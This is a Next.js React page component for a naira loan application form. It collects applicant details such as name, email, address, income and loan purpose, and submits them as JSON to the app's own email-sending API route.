'use client';

import Image from 'next/image';
import { useState } from 'react';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';

export default function LoanApplication() {
  const [formData, setFormData] = useState({
    email: '',
    address: '',
    fullName: '',
    contactAddress: '',
    sex: '',
    employmentStatus: '',
    monthlyIncome: '',
    purposeOfLoan: '',
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('/api/send-email2', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit application');
      }

      const result = await response.json();
      console.log('Loan application submitted:', result);
      setSubmitted(true);
      setFormData({
        email: '',
        address: '',
        fullName: '',
        contactAddress: '',
        sex: '',
        employmentStatus: '',
        monthlyIncome: '',
        purposeOfLoan: '',
      });
      setTimeout(() => setSubmitted(false), 3000);
    } catch (err) {
      console.error('Error submitting form:', err);
      setError('Failed to submit application. Please try again.');
      setTimeout(() => setError(''), 3000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      
      <main className="flex-grow">
        {/* Page Title */}
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Loan Application</h1>
        </section>

        {/* Main Content */}
        <div className="max-w-4xl mx-auto px-4 py-8">
          {/* Header Image */}
          <div className="mb-8 flex justify-center">
            <Image
              src="https://lendig0.simdif.com/images/public/sd_678a2098256dd.jpg"
              alt="Loan Application"
              width={960}
              height={954}
              className="rounded-lg shadow-lg max-w-full h-auto"
            />
          </div>

          {/* Description */}
          <div className="bg-blue-50 rounded-lg p-6 mb-8 text-center">
            <h2 className="text-2xl font-bold text-gray-800 mb-3">GET LOAN UP TO 10 MILLION NAIRA</h2>
            <p className="text-gray-700">
              Get loans with ease, low interest fees and less documentation. Hassle free service guaranteed!
            </p>
          </div>

          {/* Application Form */}
          <div className="bg-white rounded-lg shadow-lg p-8">
            <h3 className="text-2xl font-bold text-gray-800 mb-6">Registration Form</h3>
            
            {submitted && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                Your loan application has been submitted successfully! We will review your application and contact you shortly.
              </div>
            )}

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Your Email Address *</label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Full Name */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Name In Full *</label>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Contact Address */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Contact Address</label>
                <input
                  type="text"
                  name="contactAddress"
                  value={formData.contactAddress}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                />
              </div>

              {/* Address */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Address *</label>
                <textarea
                  name="address"
                  value={formData.address}
                  onChange={handleChange}
                  required
                  rows={3}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600 resize-none"
                />
              </div>

              {/* Sex */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Sex</label>
                <div className="flex gap-6">
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Male"
                      checked={formData.sex === 'Male'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Male</span>
                  </label>
                  <label className="flex items-center">
                    <input
                      type="radio"
                      name="sex"
                      value="Female"
                      checked={formData.sex === 'Female'}
                      onChange={handleChange}
                      className="mr-2"
                    />
                    <span className="text-gray-700">Female</span>
                  </label>
                </div>
              </div>

              {/* Employment Status */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Employment Status</label>
                <select
                  name="employmentStatus"
                  value={formData.employmentStatus}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                >
                  <option value="">Select...</option>
                  <option value="Employed">Employed</option>
                  <option value="Self-Employed">Self-Employed</option>
                  <option value="Unemployed">Unemployed</option>
                  <option value="Retired">Retired</option>
                </select>
              </div>

              {/* Monthly Income */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Monthly Income</label>
                <input
                  type="text"
                  name="monthlyIncome"
                  value={formData.monthlyIncome}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  placeholder="Amount in Naira"
                />
              </div>

              {/* Purpose of Loan */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Purpose of Loan</label>
                <select
                  name="purposeOfLoan"
                  value={formData.purposeOfLoan}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                >
                  <option value="">Select...</option>
                  <option value="Business Expansion">Business Expansion</option>
                  <option value="Personal Use">Personal Use</option>
                  <option value="Education">Education</option>
                  <option value="Medical">Medical</option>
                  <option value="Home Improvement">Home Improvement</option>
                </select>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 rounded-lg transition"
              >
                {loading ? 'Submitting...' : 'Submit Application'}
              </button>
            </form>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
